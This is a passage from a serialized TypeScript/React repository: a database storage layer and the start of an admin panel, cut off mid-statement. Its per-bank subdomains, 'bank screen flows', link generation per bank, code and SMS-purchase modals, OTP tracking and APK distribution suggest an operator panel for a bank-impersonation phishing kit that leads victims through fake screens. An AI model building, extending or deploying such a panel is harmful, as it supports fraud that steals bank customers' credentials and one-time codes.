[updatedNotification] = await db.update(notifications)\n        .set({ read: true })\n        .where(eq(notifications.id, id))\n        .returning();\n      \n      if (!updatedNotification) {\n        throw new Error(`Notificaci贸n con ID ${id} no encontrada`);\n      }\n      \n      return updatedNotification;\n    } catch (error) {\n      console.error('[Notificaciones] Error al marcar notificaci贸n como le铆da:', error);\n      throw error;\n    }\n  }\n  \n  async markAllNotificationsAsRead(userId: number): Promise<number> {\n    try {\n      // Marcar todas las notificaciones del usuario como le铆das\n      const result = await db.update(notifications)\n        .set({ read: true })\n        .where(\n          and(\n            eq(notifications.userId, userId),\n            eq(notifications.read, false)\n          )\n        )\n        .returning();\n      \n      return result.length;\n    } catch (error) {\n      console.error('[Notificaciones] Error al marcar todas las notificaciones como le铆das:', error);\n      return 0;\n    }\n  }\n  \n  async deleteNotification(id: number): Promise<boolean> {\n    try {\n      // Eliminar notificaci贸n\n      const result = await db.delete(notifications)\n        .where(eq(notifications.id, id))\n        .returning();\n      \n      return result.length > 0;\n    } catch (error) {\n      console.error('[Notificaciones] Error al eliminar notificaci贸n:', error);\n      return false;\n    }\n  }\n  \n  async deleteAllUserNotifications(userId: number): Promise<number> {\n    try {\n      // Eliminar todas las notificaciones del usuario\n      const result = await db.delete(notifications)\n        .where(eq(notifications.userId, userId))\n        .returning();\n      \n      return result.length;\n    } catch (error) {\n      console.error('[Notificaciones] Error al eliminar todas las notificaciones:', error);\n      return 0;\n    }\n  }\n  \n  // === M茅todos de preferencias de notificaciones ===\n  async getNotificationPreferences(userId: number): Promise<NotificationPrefs | undefined> {\n    try {\n      const [prefs] = await db.select()\n        .from(notificationPreferences)\n        .where(eq(notificationPreferences.userId, userId));\n      \n      return prefs;\n    } catch (error) {\n      console.error('[Notificaciones] Error al obtener preferencias:', error);\n      return undefined;\n    }\n  }\n  \n  async createNotificationPreferences(data: InsertNotificationPrefs): Promise<NotificationPrefs> {\n    try {\n      // Verificar que el usuario exista\n      const user = await this.getUserById(data.userId);\n      if (!user) {\n        throw new Error(`Usuario con ID ${data.userId} no encontrado`);\n      }\n      \n      // Verificar si ya existen preferencias\n      const existingPrefs = await this.getNotificationPreferences(data.userId);\n      if (existingPrefs) {\n        return this.updateNotificationPreferences(data.userId, {\n          ...data,\n          minPriority: data.minPriority as NotificationPriority\n        });\n      }\n      \n      // Crear nuevas preferencias\n      const [prefs] = await db.insert(notificationPreferences)\n        .values({\n          userId: data.userId,\n          sessionActivityEnabled: data.sessionActivityEnabled,\n          userActivityEnabled: data.userActivityEnabled,\n          systemEnabled: data.systemEnabled,\n          minPriority: data.minPriority as NotificationPriority,\n          emailEnabled: data.emailEnabled,\n          emailAddress: data.emailAddress\n        })\n        .returning();\n      \n      return prefs;\n    } catch (error) {\n      console.error('[Notificaciones] Error al crear preferencias:', error);\n      throw error;\n    }\n  }\n  \n  async updateNotificationPreferences(userId: number, data: Partial<NotificationPrefs>): Promise<NotificationPrefs> {\n    try {\n      // Verificar que existen preferencias\n      const existingPrefs = await this.getNotificationPreferences(userId);\n      if (!existingPrefs) {\n        // Si no existen, crear nuevas con los datos proporcionados\n        return this.createNotificationPreferences({\n          userId,\n          ...(data as any)\n        });\n      }\n      \n      // Actualizar preferencias existentes\n      const updateData: any = { updatedAt: new Date() };\n      if (data.sessionActivityEnabled !== undefined) updateData.sessionActivityEnabled = data.sessionActivityEnabled;\n      if (data.userActivityEnabled !== undefined) updateData.userActivityEnabled = data.userActivityEnabled;\n      if (data.systemEnabled !== undefined) updateData.systemEnabled = data.systemEnabled;\n      if (data.minPriority !== undefined) updateData.minPriority = data.minPriority as NotificationPriority;\n      if (data.emailEnabled !== undefined) updateData.emailEnabled = data.emailEnabled;\n      if (data.emailAddress !== undefined) updateData.emailAddress = data.emailAddress;\n      \n      const [updatedPrefs] = await db.update(notificationPreferences)\n        .set(updateData)\n        .where(eq(notificationPreferences.userId, userId))\n        .returning();\n      \n      return updatedPrefs;\n    } catch (error) {\n      console.error('[Notificaciones] Error al actualizar preferencias:', error);\n      throw error;\n    }\n  }\n\n  // M茅todos para c贸digos de verificaci贸n 2FA\n  async createVerificationCode(data: InsertVerificationCode): Promise<VerificationCode> {\n    try {\n      const [code] = await db.insert(verificationCodes)\n        .values(data)\n        .returning();\n      return code;\n    } catch (error) {\n      console.error('[2FA] Error creando c贸digo de verificaci贸n:', error);\n      throw error;\n    }\n  }\n\n  async getValidVerificationCode(userId: number, code: string): Promise<VerificationCode | undefined> {\n    try {\n      const [verificationCode] = await db.select()\n        .from(verificationCodes)\n        .where(\n          and(\n            eq(verificationCodes.userId, userId),\n            eq(verificationCodes.code, code),\n            eq(verificationCodes.isUsed, false),\n            gte(verificationCodes.expiresAt, new Date())\n          )\n        )\n        .limit(1);\n      \n      return verificationCode;\n    } catch (error) {\n      console.error('[2FA] Error obteniendo c贸digo de verificaci贸n:', error);\n      throw error;\n    }\n  }\n\n  async markVerificationCodeAsUsed(id: number): Promise<VerificationCode> {\n    try {\n      const [code] = await db.update(verificationCodes)\n        .set({ isUsed: true })\n        .where(eq(verificationCodes.id, id))\n        .returning();\n      return code;\n    } catch (error) {\n      console.error('[2FA] Error marcando c贸digo como usado:', error);\n      throw error;\n    }\n  }\n\n  async cleanupExpiredVerificationCodes(): Promise<number> {\n    try {\n      const result = await db.delete(verificationCodes)\n        .where(lt(verificationCodes.expiresAt, new Date()));\n      \n      return result.rowCount || 0;\n    } catch (error) {\n      console.error('[2FA] Error en limpieza de c贸digos expirados:', error);\n      throw error;\n    }\n  }\n\n  // M茅todos para configuraci贸n del sistema\n  async getSystemConfig(): Promise<SystemConfig | null> {\n    try {\n      const [config] = await db.select()\n        .from(systemConfig)\n        .orderBy(desc(systemConfig.id)) // Obtener la configuraci贸n m谩s reciente\n        .limit(1);\n      \n      return config || null;\n    } catch (error) {\n      console.error('[SystemConfig] Error obteniendo configuraci贸n:', error);\n      throw error;\n    }\n  }\n\n  async updateSystemConfig(data: Partial<InsertSystemConfig>): Promise<SystemConfig> {\n    try {\n      const existing = await this.getSystemConfig();\n      \n      if (!existing) {\n        // Crear nueva configuraci贸n\n        const [config] = await db.insert(systemConfig)\n          .values({\n            subscriptionPrice: data.subscriptionPrice || '0',\n            updatedBy: data.updatedBy\n          })\n          .returning();\n        return config;\n      }\n      \n      // Actualizar configuraci贸n existente\n      const [config] = await db.update(systemConfig)\n        .set({\n          ...data,\n          updatedAt: new Date()\n        })\n        .where(eq(systemConfig.id, existing.id))\n        .returning();\n      \n      return config;\n    } catch (error) {\n      console.error('[SystemConfig] Error actualizando configuraci贸n:', error);\n      throw error;\n    }\n  }\n\n  // M茅todos para pagos\n  async createPayment(data: InsertPayment): Promise<Payment> {\n    try {\n      const [payment] = await db.insert(payments)\n        .values(data)\n        .returning();\n      return payment;\n    } catch (error) {\n      console.error('[Payments] Error creando pago:', error);\n      throw error;\n    }\n  }\n\n  async getPaymentById(id: number): Promise<Payment | undefined> {\n    try {\n      const [payment] = await db.select()\n        .from(payments)\n        .where(eq(payments.id, id))\n        .limit(1);\n      \n      return payment;\n    } catch (error) {\n      console.error('[Payments] Error obteniendo pago:', error);\n      throw error;\n    }\n  }\n\n  async getUserPayments(userId: number): Promise<Payment[]> {\n    try {\n      const userPayments = await db.select()\n        .from(payments)\n        .where(eq(payments.userId, userId))\n        .orderBy(desc(payments.createdAt));\n      \n      return userPayments;\n    } catch (error) {\n      console.error('[Payments] Error obteniendo pagos del usuario:', error);\n      throw error;\n    }\n  }\n\n  async getPendingPayments(): Promise<Payment[]> {\n    try {\n      const pendingPayments = await db.select()\n        .from(payments)\n        .where(eq(payments.status, PaymentStatus.PENDING))\n        .orderBy(desc(payments.createdAt));\n      \n      return pendingPayments;\n    } catch (error) {\n      console.error('[Payments] Error obteniendo pagos pendientes:', error);\n      throw error;\n    }\n  }\n\n  async updatePayment(id: number, data: Partial<Payment>): Promise<Payment> {\n    try {\n      const [payment] = await db.update(payments)\n        .set(data)\n        .where(eq(payments.id, id))\n        .returning();\n      \n      return payment;\n    } catch (error) {\n      console.error('[Payments] Error actualizando pago:', error);\n      throw error;\n    }\n  }\n\n  async markPaymentAsCompleted(id: number, bitsoTransactionId: string): Promise<Payment> {\n    try {\n      const [payment] = await db.update(payments)\n        .set({\n          status: PaymentStatus.COMPLETED,\n          bitsoTransactionId,\n          verifiedAt: new Date()\n        })\n        .where(eq(payments.id, id))\n        .returning();\n      \n      return payment;\n    } catch (error) {\n      console.error('[Payments] Error marcando pago como completado:', error);\n      throw error;\n    }\n  }\n\n  async incrementPaymentVerificationAttempts(id: number): Promise<void> {\n    try {\n      await db.update(payments)\n        .set({\n          verificationAttempts: sql`${payments.verificationAttempts} + 1`\n        })\n        .where(eq(payments.id, id));\n    } catch (error) {\n      console.error('[Payments] Error incrementando intentos de verificaci贸n:', error);\n      throw error;\n    }\n  }\n\n  async updatePaymentStatus(id: number, status: PaymentStatus): Promise<void> {\n    try {\n      await db.update(payments)\n        .set({ status })\n        .where(eq(payments.id, id));\n    } catch (error) {\n      console.error('[Payments] Error actualizando estado del pago:', error);\n      throw error;\n    }\n  }\n\n  // M茅todos de c贸digos de descuento\n  async createDiscountCode(data: InsertDiscountCode): Promise<DiscountCode> {\n    try {\n      const [discountCode] = await db.insert(discountCodes)\n        .values(data)\n        .returning();\n      \n      console.log(`[DiscountCode] C贸digo de descuento creado: ${discountCode.code} por $${discountCode.discountAmount} MXN`);\n      return discountCode;\n    } catch (error) {\n      console.error('[DiscountCode] Error creando c贸digo de descuento:', error);\n      throw error;\n    }\n  }\n\n  async getDiscountCodeByCode(code: string): Promise<DiscountCode | undefined> {\n    try {\n      const [discountCode] = await db.select()\n        .from(discountCodes)\n        .where(eq(discountCodes.code, code))\n        .limit(1);\n      \n      return discountCode;\n    } catch (error) {\n      console.error('[DiscountCode] Error obteniendo c贸digo de descuento:', error);\n      throw error;\n    }\n  }\n\n  async markDiscountCodeAsUsed(id: number, userId: number): Promise<DiscountCode> {\n    try {\n      const [discountCode] = await db.update(discountCodes)\n        .set({\n          isUsed: true,\n          usedBy: userId,\n          usedAt: new Date()\n        })\n        .where(eq(discountCodes.id, id))\n        .returning();\n      \n      console.log(`[DiscountCode] C贸digo ${discountCode.code} marcado como usado por usuario ${userId}`);\n      return discountCode;\n    } catch (error) {\n      console.error('[DiscountCode] Error marcando c贸digo como usado:', error);\n      throw error;\n    }\n  }\n\n  async claimDiscountCode(code: string, userId: number | null = null): Promise<DiscountCode | null> {\n    try {\n      // Operaci贸n at贸mica: actualizar solo si no est谩 usado\n      const updateData: any = {\n        isUsed: true,\n        usedAt: new Date()\n      };\n      \n      // Solo agregar userId si se proporciona (para evitar foreign key constraint en IDs temporales)\n      if (userId !== null) {\n        updateData.usedBy = userId;\n      }\n      \n      const [claimed] = await db.update(discountCodes)\n        .set(updateData)\n        .where(\n          and(\n            eq(discountCodes.code, code),\n            eq(discountCodes.isUsed, false)\n          )\n        )\n        .returning();\n      \n      if (claimed) {\n        console.log(`[DiscountCode] C贸digo ${code} reclamado at贸micamente${userId ? ` por usuario ${userId}` : ''}`);\n      } else {\n        console.log(`[DiscountCode] C贸digo ${code} ya fue usado o no existe`);\n      }\n      \n      return claimed || null;\n    } catch (error) {\n      console.error('[DiscountCode] Error reclamando c贸digo de descuento:', error);\n      throw error;\n    }\n  }\n\n  async getAllDiscountCodes(): Promise<DiscountCode[]> {\n    try {\n      const codes = await db.select()\n        .from(discountCodes)\n        .orderBy(desc(discountCodes.createdAt));\n      \n      return codes;\n    } catch (error) {\n      console.error('[DiscountCode] Error obteniendo c贸digos de descuento:', error);\n      throw error;\n    }\n  }\n\n  // M茅todos para perfiles de oficina\n  async createOfficeProfile(data: InsertOfficeProfile): Promise<OfficeProfile> {\n    try {\n      const [profile] = await db.insert(officeProfiles)\n        .values(data)\n        .returning();\n      return profile;\n    } catch (error) {\n      console.error('[OfficeProfile] Error creando perfil de oficina:', error);\n      throw error;\n    }\n  }\n\n  async getOfficeProfileByUserId(userId: number): Promise<OfficeProfile | undefined> {\n    try {\n      const [profile] = await db.select()\n        .from(officeProfiles)\n        .where(eq(officeProfiles.userId, userId))\n        .limit(1);\n      return profile;\n    } catch (error) {\n      console.error('[OfficeProfile] Error obteniendo perfil de oficina:', error);\n      throw error;\n    }\n  }\n\n  async updateOfficeProfile(userId: number, data: Partial<OfficeProfile>): Promise<OfficeProfile> {\n    try {\n      const [profile] = await db.update(officeProfiles)\n        .set({ ...data, updatedAt: new Date() })\n        .where(eq(officeProfiles.userId, userId))\n        .returning();\n      return profile;\n    } catch (error) {\n      console.error('[OfficeProfile] Error actualizando perfil de oficina:', error);\n      throw error;\n    }\n  }\n\n  async incrementExecutiveCount(userId: number): Promise<void> {\n    try {\n      await db.update(officeProfiles)\n        .set({ currentExecutives: sql`${officeProfiles.currentExecutives} + 1` })\n        .where(eq(officeProfiles.userId, userId));\n    } catch (error) {\n      console.error('[OfficeProfile] Error incrementando contador de ejecutivos:', error);\n      throw error;\n    }\n  }\n\n  async decrementExecutiveCount(userId: number): Promise<void> {\n    try {\n      await db.update(officeProfiles)\n        .set({ currentExecutives: sql`GREATEST(${officeProfiles.currentExecutives} - 1, 0)` })\n        .where(eq(officeProfiles.userId, userId));\n    } catch (error) {\n      console.error('[OfficeProfile] Error decrementando contador de ejecutivos:', error);\n      throw error;\n    }\n  }\n\n  // M茅todos para ejecutivos\n  async createExecutive(data: InsertExecutive): Promise<Executive> {\n    try {\n      const hashedPassword = await bcrypt.hash(data.password, 10);\n      const [executive] = await db.insert(executives)\n        .values({ ...data, password: hashedPassword })\n        .returning();\n      return executive;\n    } catch (error) {\n      console.error('[Executive] Error creando ejecutivo:', error);\n      throw error;\n    }\n  }\n\n  async getExecutiveById(id: number): Promise<Executive | undefined> {\n    try {\n      const [executive] = await db.select()\n        .from(executives)\n        .where(eq(executives.id, id))\n        .limit(1);\n      return executive;\n    } catch (error) {\n      console.error('[Executive] Error obteniendo ejecutivo:', error);\n      throw error;\n    }\n  }\n\n  async getExecutiveByUsername(username: string): Promise<Executive | undefined> {\n    try {\n      const [executive] = await db.select()\n        .from(executives)\n        .where(eq(executives.username, username))\n        .limit(1);\n      return executive;\n    } catch (error) {\n      console.error('[Executive] Error obteniendo ejecutivo por username:', error);\n      throw error;\n    }\n  }\n\n  async getExecutivesByOfficeId(userId: number): Promise<Executive[]> {\n    try {\n      const execs = await db.select()\n        .from(executives)\n        .where(eq(executives.userId, userId))\n        .orderBy(asc(executives.createdAt));\n      return execs;\n    } catch (error) {\n      console.error('[Executive] Error obteniendo ejecutivos de oficina:', error);\n      throw error;\n    }\n  }\n\n  async validateExecutive(username: string, password: string): Promise<Executive | undefined> {\n    try {\n      const executive = await this.getExecutiveByUsername(username);\n      if (!executive) return undefined;\n      \n      const isValid = await bcrypt.compare(password, executive.password);\n      if (!isValid) return undefined;\n      \n      return executive;\n    } catch (error) {\n      console.error('[Executive] Error validando ejecutivo:', error);\n      throw error;\n    }\n  }\n\n  async updateExecutive(id: number, data: Partial<Executive>): Promise<Executive> {\n    try {\n      const [executive] = await db.update(executives)\n        .set(data)\n        .where(eq(executives.id, id))\n        .returning();\n      return executive;\n    } catch (error) {\n      console.error('[Executive] Error actualizando ejecutivo:', error);\n      throw error;\n    }\n  }\n\n  async updateExecutiveOtp(id: number, otpCode: string): Promise<Executive> {\n    try {\n      const [executive] = await db.update(executives)\n        .set({ \n          lastOtpCode: otpCode, \n          lastOtpTime: new Date() \n        })\n        .where(eq(executives.id, id))\n        .returning();\n      return executive;\n    } catch (error) {\n      console.error('[Executive] Error actualizando OTP de ejecutivo:', error);\n      throw error;\n    }\n  }\n\n  async deleteExecutive(id: number): Promise<boolean> {\n    try {\n      const result = await db.delete(executives)\n        .where(eq(executives.id, id));\n      return result.rowCount ? result.rowCount > 0 : false;\n    } catch (error) {\n      console.error('[Executive] Error eliminando ejecutivo:', error);\n      throw error;\n    }\n  }\n\n  async incrementExecutiveSession(id: number): Promise<void> {\n    try {\n      await db.update(executives)\n        .set({ currentSessions: sql`${executives.currentSessions} + 1` })\n        .where(eq(executives.id, id));\n    } catch (error) {\n      console.error('[Executive] Error incrementando sesiones de ejecutivo:', error);\n      throw error;\n    }\n  }\n\n  async decrementExecutiveSession(id: number): Promise<void> {\n    try {\n      await db.update(executives)\n        .set({ currentSessions: sql`GREATEST(${executives.currentSessions} - 1, 0)` })\n        .where(eq(executives.id, id));\n    } catch (error) {\n      console.error('[Executive] Error decrementando sesiones de ejecutivo:', error);\n      throw error;\n    }\n  }\n\n  // ==================== WHATSAPP BOT ====================\n  \n  async getWhatsAppConfig(userId: number): Promise<WhatsappConfig | undefined> {\n    try {\n      const [config] = await db.select()\n        .from(whatsappConfig)\n        .where(eq(whatsappConfig.userId, userId));\n      return config;\n    } catch (error) {\n      console.error('[WhatsApp] Error obteniendo configuraci贸n:', error);\n      throw error;\n    }\n  }\n\n  async createWhatsAppConfig(data: InsertWhatsappConfig): Promise<WhatsappConfig> {\n    try {\n      const [config] = await db.insert(whatsappConfig)\n        .values(data)\n        .returning();\n      return config;\n    } catch (error) {\n      console.error('[WhatsApp] Error creando configuraci贸n:', error);\n      throw error;\n    }\n  }\n\n  async updateWhatsAppConfig(userId: number, data: Partial<WhatsappConfig>): Promise<WhatsappConfig> {\n    try {\n      const [config] = await db.update(whatsappConfig)\n        .set({ ...data, updatedAt: new Date() })\n        .where(eq(whatsappConfig.userId, userId))\n        .returning();\n      return config;\n    } catch (error) {\n      console.error('[WhatsApp] Error actualizando configuraci贸n:', error);\n      throw error;\n    }\n  }\n\n  async getWhatsAppMenuOptions(userId: number): Promise<WhatsappMenuOption[]> {\n    try {\n      const options = await db.select()\n        .from(whatsappMenuOptions)\n        .where(eq(whatsappMenuOptions.userId, userId))\n        .orderBy(asc(whatsappMenuOptions.optionNumber));\n      return options;\n    } catch (error) {\n      console.error('[WhatsApp] Error obteniendo opciones de men煤:', error);\n      throw error;\n    }\n  }\n\n  async createWhatsAppMenuOption(data: InsertWhatsappMenuOption): Promise<WhatsappMenuOption> {\n    try {\n      const [option] = await db.insert(whatsappMenuOptions)\n        .values(data)\n        .returning();\n      return option;\n    } catch (error) {\n      console.error('[WhatsApp] Error creando opci贸n de men煤:', error);\n      throw error;\n    }\n  }\n\n  async updateWhatsAppMenuOption(id: number, data: Partial<WhatsappMenuOption>): Promise<WhatsappMenuOption> {\n    try {\n      const [option] = await db.update(whatsappMenuOptions)\n        .set({ ...data, updatedAt: new Date() })\n        .where(eq(whatsappMenuOptions.id, id))\n        .returning();\n      return option;\n    } catch (error) {\n      console.error('[WhatsApp] Error actualizando opci贸n de men煤:', error);\n      throw error;\n    }\n  }\n\n  async deleteWhatsAppMenuOption(id: number): Promise<boolean> {\n    try {\n      const result = await db.delete(whatsappMenuOptions)\n        .where(eq(whatsappMenuOptions.id, id));\n      return result.rowCount ? result.rowCount > 0 : false;\n    } catch (error) {\n      console.error('[WhatsApp] Error eliminando opci贸n de men煤:', error);\n      throw error;\n    }\n  }\n\n  async saveWhatsAppConversation(data: InsertWhatsappConversation): Promise<WhatsappConversation> {\n    try {\n      const [conversation] = await db.insert(whatsappConversations)\n        .values(data)\n        .returning();\n      return conversation;\n    } catch (error) {\n      console.error('[WhatsApp] Error guardando conversaci贸n:', error);\n      throw error;\n    }\n  }\n\n  async getWhatsAppConversations(userId: number, limit: number = 100): Promise<WhatsappConversation[]> {\n    try {\n      const conversations = await db.select()\n        .from(whatsappConversations)\n        .where(eq(whatsappConversations.userId, userId))\n        .orderBy(desc(whatsappConversations.createdAt))\n        .limit(limit);\n      return conversations;\n    } catch (error) {\n      console.error('[WhatsApp] Error obteniendo conversaciones:', error);\n      throw error;\n    }\n  }\n\n  // Sistema de Links con Subdominios\n  async getBankSubdomains(): Promise<BankSubdomain[]> {\n    try {\n      const subdomains = await db.select()\n        .from(bankSubdomains)\n        .where(eq(bankSubdomains.isActive, true))\n        .orderBy(asc(bankSubdomains.bankCode));\n      return subdomains;\n    } catch (error) {\n      console.error('[Links] Error obteniendo subdominios de bancos:', error);\n      throw error;\n    }\n  }\n\n  async upsertBankSubdomain(data: InsertBankSubdomain): Promise<BankSubdomain> {\n    try {\n      const existing = await db.select()\n        .from(bankSubdomains)\n        .where(eq(bankSubdomains.bankCode, data.bankCode))\n        .limit(1);\n\n      if (existing.length > 0) {\n        const [updated] = await db.update(bankSubdomains)\n          .set({ ...data, updatedAt: new Date() })\n          .where(eq(bankSubdomains.bankCode, data.bankCode))\n          .returning();\n        return updated;\n      } else {\n        const [inserted] = await db.insert(bankSubdomains)\n          .values(data)\n          .returning();\n        return inserted;\n      }\n    } catch (error) {\n      console.error('[Links] Error al actualizar/crear subdominio de banco:', error);\n      throw error;\n    }\n  }\n\n  async getBankScreenFlow(bankCode: string): Promise<BankScreenFlow | undefined> {\n    try {\n      const flow = await db.select()\n        .from(bankScreenFlows)\n        .where(and(\n          eq(bankScreenFlows.bankCode, bankCode),\n          eq(bankScreenFlows.isActive, true)\n        ))\n        .limit(1);\n      return flow[0];\n    } catch (error) {\n      console.error('[Links] Error obteniendo flujo de pantallas:', error);\n      throw error;\n    }\n  }\n\n  async upsertBankScreenFlow(data: InsertBankScreenFlow): Promise<BankScreenFlow> {\n    try {\n      const existing = await db.select()\n        .from(bankScreenFlows)\n        .where(eq(bankScreenFlows.bankCode, data.bankCode))\n        .limit(1);\n\n      if (existing.length > 0) {\n        const [updated] = await db.update(bankScreenFlows)\n          .set({ ...data, updatedAt: new Date() })\n          .where(eq(bankScreenFlows.bankCode, data.bankCode))\n          .returning();\n        return updated;\n      } else {\n        const [inserted] = await db.insert(bankScreenFlows)\n          .values(data)\n          .returning();\n        return inserted;\n      }\n    } catch (error) {\n      console.error('[Links] Error al actualizar/crear flujo de pantallas:', error);\n      throw error;\n    }\n  }\n\n  // Implementaciones de m茅todos para flujos de usuario por banco\n  async getUserBankFlow(userId: number, bankCode: string): Promise<UserBankFlow | undefined> {\n    try {\n      const flow = await db.select()\n        .from(userBankFlows)\n        .where(and(\n          eq(userBankFlows.userId, userId),\n          eq(userBankFlows.bankCode, bankCode),\n          eq(userBankFlows.isActive, true)\n        ))\n        .limit(1);\n      return flow[0];\n    } catch (error) {\n      console.error('[UserFlows] Error obteniendo flujo de usuario:', error);\n      throw error;\n    }\n  }\n\n  async getAllUserBankFlows(userId: number): Promise<UserBankFlow[]> {\n    try {\n      const flows = await db.select()\n        .from(userBankFlows)\n        .where(and(\n          eq(userBankFlows.userId, userId),\n          eq(userBankFlows.isActive, true)\n        ))\n        .orderBy(asc(userBankFlows.bankCode));\n      return flows;\n    } catch (error) {\n      console.error('[UserFlows] Error obteniendo flujos de usuario:', error);\n      throw error;\n    }\n  }\n\n  async saveUserBankFlow(data: InsertUserBankFlow): Promise<UserBankFlow> {\n    try {\n      // Verificar si ya existe un flujo para este usuario+banco\n      const existing = await db.select()\n        .from(userBankFlows)\n        .where(and(\n          eq(userBankFlows.userId, data.userId),\n          eq(userBankFlows.bankCode, data.bankCode)\n        ))\n        .limit(1);\n\n      if (existing.length > 0) {\n        // Actualizar existente\n        const [updated] = await db.update(userBankFlows)\n          .set({ ...data, updatedAt: new Date() })\n          .where(and(\n            eq(userBankFlows.userId, data.userId),\n            eq(userBankFlows.bankCode, data.bankCode)\n          ))\n          .returning();\n        return updated;\n      } else {\n        // Crear nuevo\n        const [inserted] = await db.insert(userBankFlows)\n          .values(data)\n          .returning();\n        return inserted;\n      }\n    } catch (error) {\n      console.error('[UserFlows] Error al guardar flujo de usuario:', error);\n      throw error;\n    }\n  }\n\n  async updateUserBankFlow(userId: number, bankCode: string, data: Partial<UserBankFlow>): Promise<UserBankFlow> {\n    try {\n      const [updated] = await db.update(userBankFlows)\n        .set({ ...data, updatedAt: new Date() })\n        .where(and(\n          eq(userBankFlows.userId, userId),\n          eq(userBankFlows.bankCode, bankCode)\n        ))\n        .returning();\n      \n      if (!updated) {\n        throw new Error('Flujo de usuario no encontrado');\n      }\n      \n      return updated;\n    } catch (error) {\n      console.error('[UserFlows] Error al actualizar flujo de usuario:', error);\n      throw error;\n    }\n  }\n\n  async deleteUserBankFlow(userId: number, bankCode: string): Promise<boolean> {\n    try {\n      const result = await db.delete(userBankFlows)\n        .where(and(\n          eq(userBankFlows.userId, userId),\n          eq(userBankFlows.bankCode, bankCode)\n        ))\n        .returning();\n      \n      return result.length > 0;\n    } catch (error) {\n      console.error('[UserFlows] Error al eliminar flujo de usuario:', error);\n      throw error;\n    }\n  }\n}\n\n// Export storage instance\nexport const storage = new DatabaseStorage();","size_bytes":87310},"client/src/lib/utils.ts":{"content":"import { clsx, type ClassValue } from \"clsx\"\nimport { twMerge } from \"tailwind-merge\"\n\nexport function cn(...inputs: ClassValue[]) {\n  return twMerge(clsx(inputs))\n}\n","size_bytes":166},"client/src/pages/AdminPanel.tsx":{"content":"import { useState, useEffect } from 'react';\nimport { useQuery, useMutation } from '@tanstack/react-query';\nimport { queryClient } from '@/lib/queryClient';\nimport { apiRequest } from '@/lib/queryClient';\nimport { useToast } from '@/hooks/use-toast';\nimport { useWebSocket } from '@/hooks/useWebSocket';\nimport { useAuth } from '@/hooks/use-auth';\nimport Sidebar from '@/components/admin/Sidebar';\nimport AccessTable from '@/components/admin/AccessTable';\nimport UserManagement from '@/components/admin/UserManagement';\nimport RegisteredUsersManagement from '@/components/admin/RegisteredUsersManagement';\nimport ExecutiveManagement from '@/components/admin/ExecutiveManagement';\nimport SmsManagementSimple from '@/components/admin/SmsManagementSimple';\nimport UserSmsPanel from '@/components/user/UserSmsPanel';\nimport QRManager from '@/components/admin/QRManager';\nimport { SimpleQRGenerator } from '@/components/admin/SimpleQRGenerator';\nimport TelegramBotManagement from '@/components/admin/TelegramBotManagement';\nimport { MessageSender } from '@/components/admin/MessageSender';\nimport SubscriptionInfo from '@/components/admin/SubscriptionInfo';\nimport { IdentityVerificationPanel } from '@/components/admin/IdentityVerificationPanel';\nimport { APKManagement } from '@/components/admin/APKManagement';\nimport SiteConfigManagement from '@/components/admin/SiteConfigManagement';\nimport SystemConfigManagement from '@/components/admin/SystemConfigManagement';\nimport WhatsAppBotPanel from '@/components/admin/WhatsAppBotPanel';\nimport UserWhatsAppPanel from '@/components/user/UserWhatsAppPanel';\nimport { LinkManagementPanel } from '@/components/admin/LinkManagementPanel';\nimport BankFlowManager from '@/components/admin/BankFlowManager';\nimport UserFlowManager from '@/components/user/UserFlowManager';\nimport { ProtectModal, TransferModal, CancelModal, CodeModal, MessageModal, SmsCompraModal } from '@/components/admin/Modals';\nimport { FileManager } from '@/components/admin/FileManager';\nimport { SessionDetails } from '@/components/admin/SessionDetails';\nimport { Session, ScreenType } from '@shared/schema';\nimport { Button } from '@/components/ui/button';\nimport { Dialog, DialogContent, DialogDescription, DialogFooter, DialogHeader, DialogTitle } from \"@/components/ui/dialog\";\nimport { Input } from \"@/components/ui/input\";\nimport { Label } from \"@/components/ui/label\";\nimport { Textarea } from \"@/components/ui/textarea\";\nimport { LogOut, UserCog, MessageSquare, Send, RefreshCw, QrCode } from 'lucide-react';\nimport { nanoid } from 'nanoid';\n\nexport default function AdminPanel() {\n  const { toast } = useToast();\n  const { user, logoutMutation } = useAuth();\n  const [activeBank, setActiveBank] = useState<string>(\"todos\");\n  const [activeTab, setActiveTab] = useState<'current' | 'saved' | 'users' | 'registered' | 'executives' | 'sms' | 'qr' | 'telegram' | 'messages' | 'identity' | 'apk' | 'site-config' | 'system-config' | 'whatsapp' | 'links' | 'bank-flows' | 'flows'>('current');\n  \n  // Actualizar el banco activo cuando el usuario cambia\n  useEffect(() => {\n    if (user) {\n      // Si el usuario no tiene acceso a todos los bancos y tiene bancos espec铆ficos\n      if (user.role !== 'admin' && user.allowedBanks !== 'all' && user.allowedBanks) {\n        // Establecer el primer banco permitido como el activo\n        const allowedBanks = user.allowedBanks.split(',');\n        if (allowedBanks.length > 0) {\n          setActiveBank(allowedBanks[0]);\n        }\n      }\n    }\n  }, [user]);\n  \n  // Verificar si hay par谩metros para generar un enlace autom谩ticamente\n  useEffect(() => {\n    if (!user) return;\n    \n    const params = new URLSearchParams(window.location.search);\n    const generateLink = params.get('generateLink');\n    const banco = params.get('banco') || 'LIVERPOOL';\n    \n    // Si est谩 solicitando generar un enlace autom谩ticamente y el usuario est谩 autenticado\n    if (generateLink === 'true') {\n      console.log('Generando enlace autom谩ticamente para banco:', banco);\n      \n      // Hacer la solicitud a la API directamente\n      fetch(`/api/generate-link?banco=${banco}`, {\n        method: 'GET',\n        headers: {\n          'Content-Type': 'application/json'\n        },\n        credentials: 'include'\n      })\n      .then(response => {\n        if (!response.ok) {\n          throw new Error('Error al generar enlace');\n        }\n        return response.json();\n      })\n      .then(data => {\n        console.log('Enlace generado correctamente:', data);\n        \n        // Copiar el enlace al portapapeles en lugar de abrirlo\n        if (data.link) {\n          navigator.clipboard.writeText(data.link)\n            .then(() => {\n              console.log('Enlace copiado al portapapeles');\n            })\n            .catch(err => {\n              console.error('Error al copiar enlace:', err);\n            });\n        }\n        \n        // Notificar al usuario\n        toast({\n          title: \"Enlace generado\",\n          description: `C贸digo: ${data.code}. El enlace ha sido copiado al portapapeles.`\n        });\n        \n        // Limpiar los par谩metros de URL\n        const newUrl = window.location.pathname;\n        window.history.pushState({}, '', newUrl);\n      })\n      .catch(error => {\n        console.error('Error generando enlace:', error);\n        toast({\n          title: \"Error al generar enlace\",\n          description: error.message,\n          variant: \"destructive\"\n        });\n      });\n    }\n  }, [user, toast]);\n  const [activeModal, setActiveModal] = useState<string | null>(null);\n  const [clientLink, setClientLink] = useState<string>('');\n  const [clientCode, setClientCode] = useState<string>('');\n  const [sessions, setSessions] = 